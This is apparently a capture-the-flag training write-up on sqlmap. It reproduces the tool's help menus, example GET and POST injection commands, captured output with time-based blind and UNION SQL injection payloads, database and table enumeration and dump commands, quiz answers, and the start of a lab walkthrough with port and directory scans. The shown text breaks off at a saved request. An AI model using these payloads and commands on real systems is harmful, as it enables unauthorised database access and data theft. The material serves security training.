---
Learn about and use Sqlmap to exploit the web application
---

![](https://i.imgur.com/2O70ow2.png)

Introduction

![](https://sqlmap.org/images/screenshot.png)  

In this room, we will learn about sqlmap and how it can be used to exploit SQL Injection vulnerabilities.

**What is sqlmap?** 

sqlmap is an open source penetration testing tool developed by Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

### **Installing Sqlmap**

If you're using Kali Linux, sqlmap is pre-installed. Otherwise, you can download it here: [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)  

Answer the questions below

Read the above and have sqlmap at the ready.

 Completed

###  Using Sqlmap

### Sqlmap Commands

### To show the basic help menu, simply type `sqlmap -h` in the terminal.

Help Message

```shell-session
nare@nare$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'
```

### **Basic** commands:  

**Options**

**Description**

-u URL, --url=URL

Target URL (e.g. "http://www.site.com/vuln.php?id=1")  

--data=DATA  

Data string to be sent through POST (e.g. "id=1")  

--random-agent  

Use randomly selected HTTP User-Agent header value  

-p TESTPARAMETER  

Testable parameter(s)  

--level=LEVEL  

Level of tests to perform (1-5, default 1)  

--risk=RISK  

Risk of tests to perform (1-3, default 1)  

### **Enumeration** commands:

### _These options can be used to enumerate the back-end database management system information, structure, and data contained in tables._

Options  

Description  

-a, --all

Retrieve everything  

-b, --banner

Retrieve DBMS banner  

--current-user  

Retrieve DBMS current user

--current-db  

Retrieve DBMS current database  

--passwords  

Enumerate DBMS users password hashes  

          --dbs               

  Enumerate DBMS databases  

--tables  

Enumerate DBMS database tables  

--columns  

Enumerate DBMS database table columns  

--schema  

Enumerate DBMS schema  

--dump  

Dump DBMS database table entries  

--dump-all  

Dump all DBMS databases tables entries  

--is-dba             

 Detect if the DBMS current user is DBA  

	-D <DB NAME>  

DBMS database to enumerate  

	-T <TABLE NAME>  

DBMS database table(s) to enumerate  

-C COL  

DBMS database table column(s) to enumerate  

### Operating System access commands

### _These options can be used to access the back-end database management system on the target operating system._

Options  

Description  

--os-shell

Prompt for an interactive operating system shell  

--os-pwn

Prompt for an OOB shell, Meterpreter or VNC  

--os-cmd=OSCMD  

Execute an operating system command  

--priv-esc  

Database process user privilege escalation  

--os-smbrelay  

One-click prompt for an OOB shell, Meterpreter or VNC  

###   

_Note that the tables shown above aren't all the possible switches to use with sqlmap. For a more extensive list of options, run `sqlmap -hh` to display the advanced help message._

Now that we've seen some of the options we can use with sqlmap, let’s jump into the examples using both GET and POST Method based requests.

  
**Simple HTTP GET Based Test**  
  
`sqlmap -u https://testsite.com/page.php?id=7 --dbs`  

Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.

  
**Simple HTTP POST Based Test**  

First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.  

![](https://i.imgur.com/xRFhXVn.png)  

You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.

Saved HTTP POST request

```shell-session
nare@nare$ cat req.txt
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.17.116
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.17.116/blood/nl-search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
Connection: close

blood_group=B%2B
```

  
  
Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command:  
  
`sqlmap -r req.txt -p blood_group --dbs`  

`**sqlmap -r <request_file> -p <vulnerable_parameter> --dbs**`

  

Here we have used two flags: -r to read the file, -p to supply the vulnerable parameter, and --dbs to enumerate the database.

Database Enumeration

```shell-session
nare@nare$ sqlmap -r req.txt -p blood_group --dbs
[19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[19:33:10] [WARNING] reflective value(s) found and filtering out
[19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
[19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:33:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:33:17] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

  
Now that we have the databases, let's extract tables from the database **blood**.

**Using GET based Method**  
  
`sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`  
**  
**Using POST based Method**

`sqlmap -r req.txt -p blood_group -D blood --tables`

**`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`  
**

Once we run these commands, we should get the tables.

Getting Tables

```shell-session
nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables
[19:35:57] [INFO] parsing HTTP request from 'req.txt'
[19:35:57] [INFO] resuming back-end DBMS 'mysql'
[19:35:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:35:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:35:58] [INFO] fetching tables for database: 'blood'
[19:35:58] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

  
  

Once we have available tables, now let’s gather the columns from the table blood_db.  
  
**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
**  
  
**Using POST based Method**

`sqlmap -r req.txt -D blood -T blood_db --columns`

**`sqlmap -r req.txt -D <database_name> -T <table_name> --columns`  
**  

Getting Tables

```shell-session
nare@nare$ sqlmap -r req.txt -D blood -T blood_db --columns
[19:35:57] [INFO] parsing HTTP request from 'req.txt'
[19:35:57] [INFO] resuming back-end DBMS 'mysql'
[19:35:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:35:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:35:58] [INFO] fetching tables for database: 'blood'
[19:35:58] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

  
Or we can simply dump all the available databases and tables using the following commands.  

  
**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all`  
  
`sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  

  
**Using POST based Method**

`sqlmap -r req.txt -D <database_name> --dump-all`  
  
`sqlmap -r req.txt-p  -D <database_name> --dump-all`  

####   

I hope you have enjoyed seeing the basics of using sqlmap and its various commands. Now, let’s start the challenge in the next task!

Answer the questions below

Which flag or option will allow you to add a URL to the command?

*-u*

Which flag would you use to add data to a POST request?

*--data*

There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?

*-p username*

Which flag would you use to show the advanced help menu?

*-hh*

Which flag allows you to retrieve everything?

*-a*

Which flag allows you to select the database name?

*-D*

Which flag would you use to retrieve database tables?

*--tables*

Which flag allows you to retrieve a table’s columns?  

*--columns*

Which flag allows you to dump all the database table entries?

*--dump-all*

Which flag will give you an interactive SQL Shell prompt?

Use advance help

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -hh  
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
    --live-cookies=L..  Live cookies file used for loading up-to-date values
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --mobile            Imitate smartphone through HTTP User-Agent header
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer, ...)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
    --ignore-proxy      Ignore system default proxy settings
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --proxy-freq=PRO..  Requests between change of proxy from a given list
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --retry-on=RETRYON  Retry request on regexp matching content (e.g. "drop")
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Regular requests between visits to a safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
    --csrf-method=CS..  HTTP method to use during anti-CSRF token page visit
    --csrf-data=CSRF..  POST data to send during anti-CSRF token page visit
    --csrf-retries=C..  Retries for anti-CSRF token retrieval (default 0)
    --force-ssl         Force usage of SSL/HTTPS
    --chunked           Use HTTP chunked transfer encoded (POST) requests
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --param-filter=P..  Select testable parameter(s) by place (e.g. "POST")
    --dbms=DBMS         Force back-end DBMS to provided value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to provided value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --smart             Perform thorough tests only if positive heuristic(s)
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-url=SEC..  Resulting page URL searched for second-order response
    --second-req=SEC..  Load second-order HTTP request from file

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Check for DBMS comments during enumeration
    --statements        Retrieve SQL statements being run on DBMS
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDE          DBMS database identifier(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First dump table entry to retrieve
    --stop=LIMITSTOP    Last dump table entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=SQLQ..  SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns
    --common-files      Check existence of common files

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=FILE..  Read a file from the back-end DBMS file system
    --file-write=FIL..  Write a local file on the back-end DBMS file system
    --file-dest=FILE..  Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
    --base64=BASE64P..  Parameter(s) containing Base64 encoded data
    --base64-safe       Use URL and filename safe Base64 alphabet (RFC 4648)
    --batch             Never ask for user input, use the default behavior
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --check-internet    Check Internet connection before assessing the target
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
    --dump-file=DUMP..  Store dumped data to a custom file
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --har=HARFILE       Log all HTTP traffic into a HAR file
    --hex               Use hex conversion during data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --preprocess=PRE..  Use given script(s) for preprocessing (request)
    --postprocess=PO..  Use given script(s) for postprocessing (response)
    --repair            Redump entries having unknown character marker (?)
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp for filtering targets
    --skip-heuristics   Skip heuristic detection of vulnerabilities
    --skip-waf          Skip heuristic detection of WAF/IPS protection
    --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")

  Miscellaneous:
    These options do not fit into any other category

    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --beep              Beep on question and/or when vulnerability is found
    --dependencies      Check for missing (optional) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --list-tampers      Display list of available tamper scripts
    --no-logging        Disable logging to a file
    --offline           Work in offline mode (only use session data)
    --purge             Safely remove all content from sqlmap data directory
    --results-file=R..  Location of CSV results file in multiple targets mode
    --shell             Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --unstable          Adjust options for unstable connections
    --update            Update sqlmap
    --wizard            Simple wizard interface for beginner users

```


*--sql-shell*

You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

All lowercase
	
*--dbms=mysql*


###  SQLMap Challenge

 Start Machine

Deploy the machine attached to this task, then navigate to `MACHINE_IP` _(this machine can take up to 3 minutes to boot)_

**Task:** 

We have deployed an application to collect 'Blood Donations'. The request seems to be vulnerable.

Exploit a SQL Injection vulnerability on the vulnerable application to find the flag.  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.60.177 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.60.177:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 21:49 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 21:49
Completed Parallel DNS resolution of 1 host. at 21:49, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 21:49
Scanning 10.10.60.177 [1 port]
Discovered open port 80/tcp on 10.10.60.177
Completed Connect Scan at 21:49, 0.27s elapsed (1 total ports)
Initiating Service scan at 21:49
Scanning 1 service on 10.10.60.177
Completed Service scan at 21:49, 6.48s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.60.177.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 4.69s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.96s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
Nmap scan report for 10.10.60.177
Host is up, received user-set (0.27s latency).
Scanned at 2023-02-04 21:49:31 EST for 12s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:49
Completed NSE at 21:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds


┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.60.177/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.60.177/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/04 21:53:08 Starting gobuster in directory enumeration mode
===============================================================
/blood                (Status: 301) [Size: 194] [--> http://10.10.60.177/blood/]
Progress: 157125 / 220561 (71.24%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/02/04 22:03:01 Finished
===============================================================

┌──(kali㉿kali)-[~/nappy/brutus]
└─$ cat req.txt         
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.60.177
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://10.10.60.177
Connection: close
